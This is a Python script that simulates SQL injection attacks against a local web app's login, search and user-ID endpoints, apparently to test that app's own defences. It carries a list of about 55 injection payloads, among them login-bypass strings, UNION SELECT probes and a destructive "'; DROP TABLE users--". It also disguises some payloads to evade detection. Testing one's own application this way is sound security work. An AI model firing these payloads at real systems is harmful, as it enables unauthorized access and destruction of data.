#!/usr/bin/env python3
"""
SQL Injection Attack Simulation
Tests SQL injection vulnerabilities with realistic evasion
"""

from attack_utils import RealisticAttacker, obfuscate_payload

BASE_URL = "http://localhost:3001"
attacker = RealisticAttacker(BASE_URL)

# SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "1' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; DROP TABLE users--",
    "1'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1 --",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",
    "admin' OR '1'='1'/*",
    "admin') OR ('1'='1--",
    "admin') OR ('1'='1'--",
    "1' OR '1'='1' UNION SELECT NULL--",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR 'a'='a'--",
    "' OR 'a'='a'/*",
    "') OR ('a'='a",
    "') OR ('a'='a'--",
    "') OR ('a'='a'/*",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "1') OR ('1'='1",
    "1') OR ('1'='1'--",
    "1') OR ('1'='1'/*",
    "admin'--",
    "admin'#",
    "admin'/*",
    "admin')--",
    "admin')#",
    "admin')/*",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND 1=1",
    "' AND 1=2",
    "1' AND 1=1",
    "1' AND 1=2"
]

def test_login_sqli():
    """Test SQL injection in login endpoint with evasion"""
    print("🔐 Testing SQL Injection in Login...")
    print(f"Target: {BASE_URL}/api/auth/login")
    print(f"User Agent: {attacker.user_agent[:60]}...\n")
    
    successful_injections = 0
    
    for i, payload in enumerate(SQLI_PAYLOADS[:15], 1):
        try:
            # Vary payload with obfuscation for evasion
            if i % 3 == 0:
                test_payload = obfuscate_payload(payload)
            else:
                test_payload = payload
            
            # Test in email field with smart_request
            response = attacker.smart_request(
                method="POST",
                endpoint="/api/auth/login",
                json_data={"email": test_payload, "password": "test"},
                retries=1
            )
            
            if response is None:
                continue
            
            print(f"Payload {i} (email): {payload[:40]}...")
            print(f"   Status: {response.status_code}")
            
            # Check for SQL error messages or unusual responses
            if response.status_code == 200:
                print(f"   ⚠️  Unusual success response!")
                successful_injections += 1
                attacker.log_attack("sqli_login", True, {"payload": payload})
            elif "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"   ⚠️  Possible SQL error detected!")
                attacker.log_attack("sqli_login", True, {"payload": payload})
            else:
                attacker.log_attack("sqli_login", False, {})
            
        except Exception as e:
            print(f"   Error: {e}")
    
    print(f"\n✅ Login SQLi tests: {successful_injections} potential vulnerabilities")
    return successful_injections

def test_search_sqli():
    """Test SQL injection in search parameter with evasion"""
    print("\n🔍 Testing SQL Injection in Search...")
    print(f"Target: {BASE_URL}/api/users?search=PAYLOAD\n")
    
    vulnerabilities = 0
    
    for i, payload in enumerate(SQLI_PAYLOADS[:10], 1):
        try:
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/users",
                params={"search": payload},
                retries=1
            )
            
            if response is None:
                continue
            
            print(f"Payload {i}: {payload[:40]}...")
            print(f"   Status: {response.status_code}")
            
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"   ⚠️  Possible SQL error detected!")
                vulnerabilities += 1
                attacker.log_attack("sqli_search", True, {"payload": payload})
            else:
                attacker.log_attack("sqli_search", False, {})
            
        except Exception as e:
            print(f"   Error: {e}")
    
    print(f"\n✅ Search SQLi tests: {vulnerabilities} issues found")
    return vulnerabilities

def test_user_id_sqli():
    """Test SQL injection in user ID parameter with evasion"""
    print("\n👤 Testing SQL Injection in User ID...")
    print(f"Target: {BASE_URL}/api/users?id=PAYLOAD\n")
    
    vulnerabilities = 0
    
    for payload in SQLI_PAYLOADS[:5]:
        try:
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/users",
                params={"id": payload},
                retries=1
            )
            
            if response is None:
                continue
            
            print(f"Payload: {payload[:40]}...")
            print(f"   Status: {response.status_code}")
            
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"   ⚠️  Possible SQL error detected!")
                vulnerabilities += 1
                attacker.log_attack("sqli_userid", True, {"payload": payload})
            else:
                attacker.log_attack("sqli_userid", False, {})
            
        except Exception as e:
            print(f"   Error: {e}")
    
    print(f"\n✅ User ID SQLi tests: {vulnerabilities} issues found")
    return vulnerabilities

if __name__ == "__main__":
    login_vulns = test_login_sqli()
    search_vulns = test_search_sqli()
    user_vulns = test_user_id_sqli()
    
    total_vulns = login_vulns + search_vulns + user_vulns
    print(f"\n📊 Overall Results: {total_vulns} potential SQL injection vulnerabilities detected")
    
    # Log summary
    attacker.log_attack("sqli_summary", total_vulns > 0, {"total_vulnerabilities": total_vulns})
    attacker.save_attack_log("sqli_attack_log.json")
